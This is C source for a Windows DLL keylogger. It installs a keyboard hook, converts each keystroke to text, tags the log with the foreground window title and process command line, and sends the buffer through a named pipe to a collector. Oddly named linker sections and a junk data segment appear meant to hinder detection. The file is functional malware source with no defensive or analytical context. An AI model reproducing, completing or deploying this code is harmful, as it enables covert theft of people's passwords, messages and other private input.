#include "hk.h"

#pragma comment(linker,"/SECTION:.GAGAgaGA,EWR /SECTION:.rdata,EWR")
#pragma comment(linker,"/merge:.data=.GAGAgaGA ") ///merge:.edata=.GAGAgaGA")

//#pragma optimize("gsy",on)
#pragma data_seg(".CocHU")
char cochu[]="ksdjfh lsjhfsdFGFD Gdfgdfg YAAAAAAA 0x41 0x410x410x410x410x410x410x41  0x410x41";
#pragma data_seg()

#pragma data_seg(".GAGAgaGA")

UINT uScanCode;
BYTE *KeyState; 
WORD wc;        
DWORD dwRead;
char *title;
char *tmpbuffer;
char *cmdline;
int reads = 0;
char c;
HANDLE hPipe = NULL;
DWORD pBuf = 0;
char *mData;
HWND win = 0 ,winold = 0;

#pragma data_seg()

#pragma code_seg(".yaxaxaxaxaxa")
EXPORT HHOOK xHook = NULL;


BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)	
	{
	case DLL_PROCESS_ATTACH:
		tmpbuffer=(char*)malloc(MAX_PATH*2);
			cmdline=(char*)malloc(MAX_PATH*2);
		title=(char*)malloc(256);
		KeyState=(BYTE*)malloc(256);
		mData=(char*)malloc(BUFSIZE);

		deb("HK.DLL Attached to process %d. Base address: 0x%x.\n",
			GetCurrentProcessId(), hModule);
		deb("DLL: xHook at 0x%p", xHook);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		deb("HK.DLL Detached from process %d.\n", GetCurrentProcessId());
		mykey(0, 0, 1);
		break;
	}
	return TRUE;
}

EXPORT LRESULT CALLBACK KeyProc(int code,WPARAM wParam,LPARAM lParam)
{
	if(!xHook) {
		deb("DLL: null xHook, returning");
		return 0;
	}
	if(code < 0)
		return CallNextHookEx(xHook, code, wParam, lParam);
	// Process the key only once
	if ((lParam & 0x80000000) || (lParam & 0x40000000))
		return CallNextHookEx(xHook, code, wParam, lParam);

	if(lParam > 0x8000)
		mykey(wParam, lParam, 0);
	return 0;
}

int mykey(WPARAM wPararam, LPARAM lPararam, int dumpout = 0)
{
	if(dumpout) 
	{
		deb("Dumping data due to detaching...");
		hPipe = CreateFile(PIPENAME, GENERIC_WRITE, FILE_SHARE_READ,
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hPipe == INVALID_HANDLE_VALUE) {
			deb("hPipe: %s", FORMATERROR);
			hPipe = NULL;
			goto exit;
		}
		if(WriteFile(hPipe, mData, strlen(mData), &dwRead, NULL) == 0) 
			deb("WriteFile: %s", FORMATERROR);
		deb("Dumped %d bytes to pipe.", dwRead);
		CloseHandle(hPipe);
		return 0;
	}

	uScanCode = MapVirtualKey(wPararam,0);
	SetUserDesktop(1);
	GetKeyboardState(KeyState); 

	if(ToAscii(wPararam, uScanCode, KeyState, &wc, 0) == 1) 
	{
		c = (char) wc;
		deb("Got ascii: %c 0x%x pBuf: %d mData: 0x%p\n", c, (int)c, pBuf, mData);
		if((c != 8 && c != 13 && c != 9) && (c < 32 || c > 126)) 
		{
			if(c < (char)0xE0 || c > (char)0xFF)
				goto exit;
		}	
		win = GetForegroundWindow();
		if(win != winold || strlen(mData) < 5) 
		{
			winold = win;
			reads = 0;
			if(GetWindowText(win, title, 255) > 0) 
			{
				lstrcpy(cmdline, GetCommandLine());
				wsprintf(tmpbuffer, "\n[%s <%s>]\n", title, cmdline);
				if(mData[0])
					lstrcat(mData, tmpbuffer);
				else 
					lstrcpy(mData, tmpbuffer);
				pBuf+= lstrlen(tmpbuffer);
			} 
		}
		if(pBuf >= MAX_LOG_KEYS) 
		{
			hPipe = CreateFile(PIPENAME, GENERIC_WRITE, FILE_SHARE_READ,
				NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if(hPipe == INVALID_HANDLE_VALUE) {
				deb("hPipe: %s", FORMATERROR);
				goto exit;
			}
			if(WriteFile(hPipe, mData, strlen(mData), &dwRead, NULL) == 0) 
			{
				deb("WriteFile: %s", FORMATERROR);
			} else {
				deb("Dumped %d bytes to pipe.", dwRead);
			}
			CloseHandle(hPipe);
			pBuf = 0;
			memset(mData, 0, sizeof(mData));
		}
		if(c == 9)
			c = 0x20;
		if(c == 8) {
			if(reads != 0 && pBuf != 0) 
				mData[--pBuf] = 0x0 , reads--;
			goto exit;
		} 
		else if(c == 13) {
			mData[pBuf++] = '\n';
			mData[pBuf] = 0x0;
			reads++;
			goto exit;
		}
		mData[pBuf] = c;
		mData[pBuf + 1] = 0x0;
		pBuf++;
		reads++;
	}
exit:
	SetUserDesktop(0);
	return 0;
}
